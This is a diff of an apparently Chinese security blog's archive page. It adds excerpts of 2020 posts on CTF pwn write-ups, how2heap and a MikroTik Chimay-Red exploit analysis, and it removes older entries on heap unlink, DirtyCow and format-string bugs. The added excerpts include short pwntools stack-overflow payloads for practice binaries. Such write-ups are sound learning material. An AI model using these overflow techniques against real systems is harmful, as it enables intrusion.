@@ -346,6 +346,251 @@
     
     
     <article class="index-post">
+        <a class="abstract-title" href="/2020/03/15/BUUCTF_pwn_writeup/">
+            
+                <span>[Untitled Post]</span>
+        </a>
+        <div class="abstract-content">
+            1.test_your_nc直接使用nc命令即可，本来还以为会有欢迎页面什么的，结果就是黑屏直接输入命令
+2.rip简单的栈溢出12345678from pwn import *p = process('./pwn1')#p = remote("node3.buuoj.cn",27060)payload = "a"*15+"BBBBBBBB"+p64(0x040118a)p.sendline(payload)p.interactive()
+3.warmup_csaw_2016简单的栈溢出，将返回地址改成上面这个函数就行12345678from pwn import *sh = proce...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/15</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/03/14/ctfhub_pwn刷题WP/">
+            
+                <span>[Untitled Post]</span>
+        </a>
+        <div class="abstract-content">
+            from pwn import *import sys, oscontext(arch=’amd64’, os=’linux’, log_level=’info’)
+if len(sys.argv) &gt; 1:    if sys.argv[1][0] == ‘r’:   # remote        p = remote(‘178.62.249.106’, 8642)else:    os.environ[‘LD_PRELOAD’] = ‘’    p = process(‘./mrs._hudson’)
+libc = ELF(‘.’)elf = ELF(‘.’)payload ...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/14</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/03/11/Pwnable.kr详解/">
+            
+                <span>[Untitled Post]</span>
+        </a>
+        <div class="abstract-content">
+            在网上发现了一个pwn的题库，页面非常的可爱，所以就做了下，在这里记录下做题的过程。题目网址是：http://pwnable.kr/play.php页面是不是非常可爱
+Toddler’s Bottlefd首先是第一题，和文件描述符有关
+文件描述符Linux 系统中，把一切都看做是文件，当进程打开现有文件或创建新文件时，内核向进程返回一个文件描述符，文件描述符就是内核为了高效管理已被打开的文件所创建的索引，用来指向被打开的文件，所有执行I/O操作的系统调用都会通过文件描述符。
+特点
+每个文件描述符会与一个打开的文件相对应
+不同的文件描述符也可能指向同一个文件
+相同的文件可以被不同的进程打开...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/11</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/03/05/SQL词义分析(状态自动机)/">
+            
+                <span>[Untitled Post]</span>
+        </a>
+        <div class="abstract-content">
+            四则运算首先从四则运算引入，这个也算是一个很基础的程序设计题目，输入一个字符串里面含有 + , - , * , / , ( , ) 这些字符还有数字，然后我们计算出最终的结果。
+
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/05</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/03/04/Mikrotik Chimay-Red 分析/">
+            
+                <span>[Untitled Post]</span>
+        </a>
+        <div class="abstract-content">
+            Chimay-Red是针对MikroTik RouterOs中www程序存在的一个漏洞的利用工具，该工具在泄露的Vault 7文件中提及。利用该工具，在无需认证的前提下可在受影响的设备上实现远程代码执行，从而获取设备的控制权。该漏洞本质上是一个整数溢出漏洞，对漏洞的利用则通过堆叠远程多线程栈空间的思路完成。
+环境搭建安装虚拟机1.首先在MikroTik官网下载我们所需版本的ISO文件，使用VM搭建环境
+
+6.38.4，x86架构，用于进行漏洞分析6.38.5，x86架构，用于进行补丁分析
+
+
+2.在进行安装的时候需要注意要选择磁盘格式为IDE，默认的事SCSI，这个是无法正常安装的，而且...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/04</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/03/02/how2heap/">
+            
+                <span>[Untitled Post]</span>
+        </a>
+        <div class="abstract-content">
+            how2heap总结题目地址：https://github.com/shellphish/how2heap
+实验环境：
+
+Ubuntu 16.04
+git clone上面的链接里的文件，直接在文件夹里执行make命令
+
+malloc_playground先来说下格式化输出函数fprintf()中的stdout、stderr。printf是标准输出函数，也就是输出到屏幕上的，fprintf是输出到流的，stdout标准输出、stderr标准错误输出，二者默认向屏幕输出。如果重定向输出到磁盘文件，则stdout输出到该文件，而stderr仍输出到屏幕。
+1intptr_t arg1, arg...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/03/02</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/02/09/HITCON Training Writeup/">
+            
+                <span>[Untitled Post]</span>
+        </a>
+        <div class="abstract-content">
+            HITCON-Training-Writeup最近在学习PWN，学习完了知识点，就找了一些题库来练习，HITCON-Training是一个对新手十分友好的题库，题目基本涵盖了ctf pwn中的所有常见知识点。
+题目链接
+在我学习的过程中也参考了网上的一些教程，但是网上的很多东西写的云龙混杂，EXP教程执行出来都是错的也有一些代码写的很冗杂，所以我就想自己写一篇教程。这个WP的所有代码都是我运行之后无误的，所以可参考的价值比较高。
+lab1-sysmagic我们发现flag的输出和输入并没有关系，而且输入分检测只有if一个判断，使用IDA修改指令即可。修改JNZ的机器码为74,即可修改为J...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/02/09</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/02/07/pwnxyz/">
+            
+                <span>[Untitled Post]</span>
+        </a>
+        <div class="abstract-content">
+            pwnable.xyz题解，WriteUpwelcome先使用IDA查看源码
+
+程序的功能就是开辟一个空间地址是v3，然后后面根据用户输入的大小再开辟一个堆，最后要进行一个比较，如果v3的内容是0，就可以读取flag
+使用GDB进行调试先看程序开启了什么防护因为程序开启了PIE所以这里看到的函数地址比IDA中看到的大0x555555554000（Linux下PIE的性质）所以在main函数处下断点运行到第一个malloc后查看返回的v3的地址
+先随便输入一个较小的数字，发现这次申请的内存和v3相差的很远所以如果我们想通过这次的输入来覆盖v3是不可能的。题目的突破口是题目中将v3的地址打印...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/02/07</span>
+            </div>
+            <!-- tags  -->
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
+        <a class="abstract-title" href="/2020/01/03/PowerPC汇编学习/">
+            
+                <span>PowerPC汇编学习</span>
+        </a>
+        <div class="abstract-content">
+            什么是 PowerPC
+PowerPC（英语：Performance Optimization With Enhanced RISC – Performance Computing，有时简称PPC）是一种精简指令集（RISC）架构的中央处理器（CPU），其基本的设计源自IBM的POWER（Performance Optimized With Enhanced RISC）架构。POWER是1991年，Apple、IBM、Motorola组成的AIM联盟所发展出的微处理器架构。PowerPC是整个AIM联盟平台的一部分，并且是到目前为止唯一的一部分。但苹果电脑自2005年起，将旗下电脑产品转...
+        </div>
+        <div class="abstract-post-meta">
+            <!-- date  -->
+            <div class="abstract-date">
+                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2020/01/03</span>
+            </div>
+            <!-- tags  -->
+            
+            <div class="abstract-tags">
+    
+        <a class="post-tag" href="javascript:void(0);" data-tags="powerpc,汇编">powerpc,汇编</a>
+    
+</div>
+            
+        </div>
+    </article>
+    
+    
+    
+    
+    
+    
+    <article class="index-post">
         <a class="abstract-title" href="/2019/12/11/HITCON-Trainging-lab13/">
             
                 <span>HITCON Trainging lab13详解</span>
@@ -377,339 +622,10 @@ edit_heap重点是...
         </div>
     </article>
     
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/11/11/Linux堆溢出unlink攻击/">
-            
-                <span>Linux堆溢出unlink攻击</span>
-        </a>
-        <div class="abstract-content">
-            引入
-先来看一段漏洞程序
-
-123456789101112#include &lt;stdlib.h&gt;#include &lt;string.h&gt;int main(int argc, char *argv[])&#123;    char *first, *second;    first = malloc(666);    second = malloc(12);    if (argc != 1)        strcpy(first, argv[1]);    free(first);    free(second);    return 0;&#125;
-
-程序含义...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/11/11</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="unlink,heap,pwn,Android">unlink,heap,pwn,Android</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/11/06/Linux堆溢出漏洞--off-by-one/">
-            
-                <span>Linux堆溢出漏洞--off-by-one</span>
-        </a>
-        <div class="abstract-content">
-            how2heap
-how2heap这是由 shellphish 团队创建的一个仓库，是用来学习堆利用技术广为周知的地方。 且主要针对 glibc。我在这里先放几个网上找的学习笔记，日后我再做以进一步总结。https://zoepla.github.io/2018/05/how2heap%E7%B3%BB%E5%88%97(%E5%9F%BA%E7%A1%80%E7%AF%87)/https://xz.aliyun.com/t/2582http://1nv0k3r.me/2019/02/26/how2heap-%E5%AD%A6%E4%B9%A0%E8%AE%B0%E5%BD%95/htt...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/11/06</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="Heap,overflow,pwn">Heap,overflow,pwn</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/11/01/CCProxy栈溢出漏洞分析及利用/">
-            
-                <span>CCProxy栈溢出漏洞分析及利用</span>
-        </a>
-        <div class="abstract-content">
-            实验环境
-分析机：winXP SP3（吾爱破解版）IP：172.20.10.3
-
-漏洞分析介绍CCProxy
-CCProxy因其设 置简单和使用方便 等特点，成为国内 最受欢迎的代理服 务器软件。CCProxy不但支 持常见的HTTP和 SOCKS代理，而且还 支持FTP和Telnet这 类不常用的协议及 其它协议。
-
-
-
-
-邮件：邮件代理服务，如果服务器上已经安装了邮件服务器，那么请取消该选项。
-DNS：域名解析服务，如果服务器上已经另行配置了DNS服务器，那么请取消该选项，如果启用该选项，那么请确保在客户端的网络设置中将DNS地址设置成CCProxy服务器的地址。
-网页缓存：对应上网...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/11/01</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="CCProxy,栈溢出,pwn">CCProxy,栈溢出,pwn</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/10/28/DirtyCow漏洞复现及原理分析/">
-            
-                <span>DirtyCow漏洞复现及原理分析</span>
-        </a>
-        <div class="abstract-content">
-            基本概括
-漏洞编号：CVE-2016-5195漏洞名称：脏牛（Dirty COW）漏洞危害：低权限用户利用该漏洞技术可以在全版本Linux系统上实现本地提权影响范围：Linux内核&gt;=2.6.22（2007年发行）开始就受影响了，直到2016年10月18日才修复
-
-
-脏牛漏洞是竞争危害中的一个案例。自从2007年开始它就已经存在于Linux之中，但直到2016年10月份才被发现和利用。这一个漏洞几乎影响所有的以Linux为基础发展起来的操作系统，包括安卓，因此产生了严重的后果：攻击者可以通过该漏洞获得ROOT权限。该漏洞存在于Linux内核的Copy-On-Write代码中。通过该...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="Linux,DirtyCow">Linux,DirtyCow</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/10/28/树状数组/">
-            
-                <span>树状数组</span>
-        </a>
-        <div class="abstract-content">
-            引入
-这里通过一个简单的题目展开介绍，先输入一个长度为n的数组，然后我们有如下两种操作：
-
-输入一个数m，输出数组中下标1~m的前缀和
-对某个指定下标的数进行值的修改多次执行上述两种操作
-
-
-
-普通方法对于一个的数组，如果需要求1~m的前缀和我们可以将其从下标1开始对m个数进行求和，对于n次操作，时间复杂度是O(n^2)，12for i 1 -&gt; msum += num[i]
-
-
-对于值的修改，我们可以直接通过下标找到要修改的数，n次操作时间复杂度为O(n)，在数组n开得比较大的时候，求前缀和的效率显得低了
-
-
-优化的方式：初始我们用一个数组A的保存每个位置的初始值，然后用一个辅助...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/28</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ACM,树状数组">ACM,树状数组</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/10/17/堆的分配原理分析/">
-            
-                <span>堆的分配原理分析</span>
-        </a>
-        <div class="abstract-content">
-            
-这段时间在学习堆溢出，在网上找到了一些好的堆的讲解，在这里做一个总结
-
-
-参考文献：
-
-https://paper.seebug.org/papers/Archive/refs/heap/glibc%e5%86%85%e5%ad%98%e7%ae%a1%e7%90%86ptmalloc%e6%ba%90%e4%bb%a3%e7%a0%81%e5%88%86%e6%9e%90.pdf
-
-
-基础知识X86 平台 Linux 进程内存布局
-在Linux上，以32 位机器为例，程序在固定位置开始加载，通常是128M处，首先被载入的是.text 段，然后是.data 段，最后是.bss 段。这可...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/17</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="pwn,堆,glibc">pwn,堆,glibc</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/10/14/ucore-lab0,lab1/">
-            
-                <span>ucore_lab0,lab1</span>
-        </a>
-        <div class="abstract-content">
-            lab0
-之前对于Linux和汇编也有一些接触，所以实验报告里我只记录之前不太熟悉的内容
-
-make和makefile
-在阅读实验指导书的同时，这里也记录我学习make的心得
-
-makefile的规则
-make命令是GNU的工程化编译工具，它用于编译大量互相关联的源代码，使用它可以实现项目的工程化管理，提高开发效率。
-
-
-综上，编译链接的过程是：
-
-首先源文件会通过编译阶段生成中间目标文件，再由中间目标文件生成执行文件。
-编译时编译器只检测程序的语法、函数，变量是否声明以及一些预处理。如果函数只是声明但是未实现则编译器只会警告(不是所有的编译器都是这样)，仍然可以生成中间目标文件。
-在链...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/14</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="ucore,lab0,lab1">ucore,lab0,lab1</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/10/09/pwn-堆溢出/">
-            
-                <span>PWN-堆溢出</span>
-        </a>
-        <div class="abstract-content">
-            堆的详解https://sploitfun.wordpress.com/2015/02/10/understanding-glibc-malloc/comment-page-1/
-什么是堆
-堆是分配给每个程序的内存区域。与堆栈不同，堆内存可以动态分配。这意味着程序可以在需要时从堆段中“请求”和“释放”内存。同样，该存储器是全局的，即可以从程序中的任何位置访问和修改该存储器，并且不局限于分配它的功能。这是通过使用“指针”引用动态分配的内存来实现的，与使用局部变量（在堆栈上）相比，这反过来导致性能略有下降。我们一般称管理堆的那部分程序为堆管理器。堆管理器处于用户程序与内核中间，主要做以下工作...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/10/09</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="pwn,Heap">pwn,Heap</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
-    
-    
-    
-    
-    
-    <article class="index-post">
-        <a class="abstract-title" href="/2019/09/30/格式化字符串漏洞/">
-            
-                <span>格式化字符串漏洞</span>
-        </a>
-        <div class="abstract-content">
-            格式化字符串函数介绍
-  格式化字符串函数可以接受可变数量的参数，并将第一个参数作为格式化字符串，根据其来解析之后的参数。通俗来说，格式化字符串函数就是将计算机内存中表示的数据转化为我们人类可读的字符串格式。几乎所有的 C/C++ 程序都会利用格式化字符串函数来输出信息，调试程序，或者处理字符串。一般来说，格式化字符串在利用的时候主要分为三个部分1.格式化字符串函数2.格式化字符串3.后续参数，可选
-
-
-格式化字符串漏洞原理
-格式化字符串函数是根据格式化字符串函数来进行解析的。那么相应的要被解析的参数的个数也自然是由这个格式化字符串所控制。比如说’%s’表明我们会输出一个字符串参数。
-
-...
-        </div>
-        <div class="abstract-post-meta">
-            <!-- date  -->
-            <div class="abstract-date">
-                <span class="abstract-calander iconfont-archer">&#xe676;</span><span class="abstract-time">2019/09/30</span>
-            </div>
-            <!-- tags  -->
-            
-            <div class="abstract-tags">
-    
-        <a class="post-tag" href="javascript:void(0);" data-tags="pwn,Format String Vulnerability">pwn,Format String Vulnerability</a>
-    
-</div>
-            
-        </div>
-    </article>
-    
     <!-- paginator  -->
     
     <nav class="page-nav">
-        <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><a class="page-number" href="/archives/page/4/">4</a><a class="extend next" rel="next" href="/archives/page/2/">NEXT &#62;</a>
+        <span class="page-number current">1</span><a class="page-number" href="/archives/page/2/">2</a><a class="page-number" href="/archives/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/archives/page/5/">5</a><a class="extend next" rel="next" href="/archives/page/2/">NEXT &#62;</a>
     </nav>
     
 </main>
@@ -1323,9 +1239,161 @@ make命令是GNU的工程化编译工具，它用于编译大量互相关联的�
     
     
     
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
     <div class="total-and-search">
         <div class="total-archive">
-        Total : 37
+        Total : 45
         </div>
         <!-- search  -->
         
@@ -1335,6 +1403,60 @@ make命令是GNU的工程化编译工具，它用于编译大量互相关联的�
     
     
     
+    
+    <div class="archive-year"> 2020 </div>
+    <ul class="year-list">
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/15</span><a class="archive-post-title" href="/2020/03/15/BUUCTF_pwn_writeup/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/14</span><a class="archive-post-title" href="/2020/03/14/ctfhub_pwn刷题WP/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/11</span><a class="archive-post-title" href="/2020/03/11/Pwnable.kr详解/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/05</span><a class="archive-post-title" href="/2020/03/05/SQL词义分析(状态自动机)/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/04</span><a class="archive-post-title" href="/2020/03/04/Mikrotik Chimay-Red 分析/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/02</span><a class="archive-post-title" href="/2020/03/02/how2heap/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/09</span><a class="archive-post-title" href="/2020/02/09/HITCON Training Writeup/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/07</span><a class="archive-post-title" href="/2020/02/07/pwnxyz/">[Untitled Post]</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/03</span><a class="archive-post-title" href="/2020/01/03/PowerPC汇编学习/">PowerPC汇编学习</a>
+        </li>
+    
+    
+    
+    
+    
+        </ul>
     
     <div class="archive-year"> 2019 </div>
     <ul class="year-list">
@@ -1397,11 +1519,6 @@ make命令是GNU的工程化编译工具，它用于编译大量互相关联的�
     
         <li class="archive-post-item">
             <span class="archive-post-date">09/27</span><a class="archive-post-title" href="/2019/09/27/看雪KCTF2019wp/">看雪KCTF2019wp</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
-            <span class="archive-post-date">09/25</span><a class="archive-post-title" href="/2019/09/25/与权权的秦皇岛之行/">与权权的秦皇岛之行</a>
         </li>
     
     
@@ -1476,22 +1593,22 @@ make命令是GNU的工程化编译工具，它用于编译大量互相关联的�
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/使用动态规划-DP-解决最大公共子串与最大公共子序列问题/">使用动态规划(DP)解决最大公共子串与最大公共子序列问题</a>
-        </li>
-    
-    
-        <li class="archive-post-item">
             <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/素数个数求解与素数的判定/">素数个数求解与素数的判定</a>
         </li>
     
     
         <li class="archive-post-item">
-            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/CTF中的编码总结/">CTF中的编码总结</a>
+            <span class="archive-post-date">05/22</span><a class="archive-post-title" href="/2019/05/22/使用动态规划-DP-解决最大公共子串与最大公共子序列问题/">使用动态规划(DP)解决最大公共子串与最大公共子序列问题</a>
         </li>
     
     
         <li class="archive-post-item">
             <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/自己动手写工具(2)--TCP代理/">自己动手写工具(2)--TCP代理</a>
+        </li>
+    
+    
+        <li class="archive-post-item">
+            <span class="archive-post-date">05/10</span><a class="archive-post-title" href="/2019/05/10/CTF中的编码总结/">CTF中的编码总结</a>
         </li>
     
     
@@ -1529,17 +1646,19 @@ make命令是GNU的工程化编译工具，它用于编译大量互相关联的�
         <div class="sidebar-panel-tags">
     <div class="sidebar-tags-name">
     
-        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
-    
         <span class="sidebar-tag-name" data-tags="ACM,数论"><span class="iconfont-archer">&#xe606;</span>ACM,数论</span>
     
         <span class="sidebar-tag-name" data-tags="ctf,web,编码"><span class="iconfont-archer">&#xe606;</span>ctf,web,编码</span>
     
-        <span class="sidebar-tag-name" data-tags="Heap,overflow,pwn"><span class="iconfont-archer">&#xe606;</span>Heap,overflow,pwn</span>
-    
         <span class="sidebar-tag-name" data-tags="Linux,LAMP"><span class="iconfont-archer">&#xe606;</span>Linux,LAMP</span>
     
         <span class="sidebar-tag-name" data-tags="防火墙,iptables"><span class="iconfont-archer">&#xe606;</span>防火墙,iptables</span>
+    
+        <span class="sidebar-tag-name" data-tags="Heap,overflow,pwn"><span class="iconfont-archer">&#xe606;</span>Heap,overflow,pwn</span>
+    
+        <span class="sidebar-tag-name" data-tags="逆向,CTF"><span class="iconfont-archer">&#xe606;</span>逆向,CTF</span>
+    
+        <span class="sidebar-tag-name" data-tags="powerpc,汇编"><span class="iconfont-archer">&#xe606;</span>powerpc,汇编</span>
     
         <span class="sidebar-tag-name" data-tags="SSH,端口转发"><span class="iconfont-archer">&#xe606;</span>SSH,端口转发</span>
     
@@ -1555,11 +1674,11 @@ make命令是GNU的工程化编译工具，它用于编译大量互相关联的�
     
         <span class="sidebar-tag-name" data-tags="花指令,静态调试,Movfuscator"><span class="iconfont-archer">&#xe606;</span>花指令,静态调试,Movfuscator</span>
     
+        <span class="sidebar-tag-name" data-tags="ACM,树状数组"><span class="iconfont-archer">&#xe606;</span>ACM,树状数组</span>
+    
         <span class="sidebar-tag-name" data-tags="XCTF,逆向"><span class="iconfont-archer">&#xe606;</span>XCTF,逆向</span>
     
         <span class="sidebar-tag-name" data-tags="看雪,KCTF,逆向,PWN"><span class="iconfont-archer">&#xe606;</span>看雪,KCTF,逆向,PWN</span>
-    
-        <span class="sidebar-tag-name" data-tags="ACM,树状数组"><span class="iconfont-archer">&#xe606;</span>ACM,树状数组</span>
     
         <span class="sidebar-tag-name" data-tags="工具,python,Netcat"><span class="iconfont-archer">&#xe606;</span>工具,python,Netcat</span>
     
@@ -1569,9 +1688,9 @@ make命令是GNU的工程化编译工具，它用于编译大量互相关联的�
     
         <span class="sidebar-tag-name" data-tags="CCProxy,栈溢出,pwn"><span class="iconfont-archer">&#xe606;</span>CCProxy,栈溢出,pwn</span>
     
-        <span class="sidebar-tag-name" data-tags="Linux,GOT,PLT"><span class="iconfont-archer">&#xe606;</span>Linux,GOT,PLT</span>
-    
         <span class="sidebar-tag-name" data-tags="unlink,heap,pwn,Android"><span class="iconfont-archer">&#xe606;</span>unlink,heap,pwn,Android</span>
+    
+        <span class="sidebar-tag-name" data-tags="Linux,GOT,PLT"><span class="iconfont-archer">&#xe606;</span>Linux,GOT,PLT</span>
     
         <span class="sidebar-tag-name" data-tags="pwn,Heap"><span class="iconfont-archer">&#xe606;</span>pwn,Heap</span>
     
@@ -1628,19 +1747,17 @@ jsonContent:
         <div class="sidebar-panel-categories">
     <div class="sidebar-categories-name">
     
-        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
-    
         <span class="sidebar-category-name" data-categories="ACM"><span class="iconfont-archer">&#xe60a;</span>ACM</span>
     
         <span class="sidebar-category-name" data-categories="CTFweb"><span class="iconfont-archer">&#xe60a;</span>CTFweb</span>
     
-        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
-    
         <span class="sidebar-category-name" data-categories="Linux"><span class="iconfont-archer">&#xe60a;</span>Linux</span>
     
-        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
+        <span class="sidebar-category-name" data-categories="PWN"><span class="iconfont-archer">&#xe60a;</span>PWN</span>
     
-        <span class="sidebar-category-name" data-categories="爱的日记"><span class="iconfont-archer">&#xe60a;</span>爱的日记</span>
+        <span class="sidebar-category-name" data-categories="逆向"><span class="iconfont-archer">&#xe60a;</span>逆向</span>
+    
+        <span class="sidebar-category-name" data-categories="内网渗透"><span class="iconfont-archer">&#xe60a;</span>内网渗透</span>
     
         <span class="sidebar-category-name" data-categories="社工"><span class="iconfont-archer">&#xe60a;</span>社工</span>
     
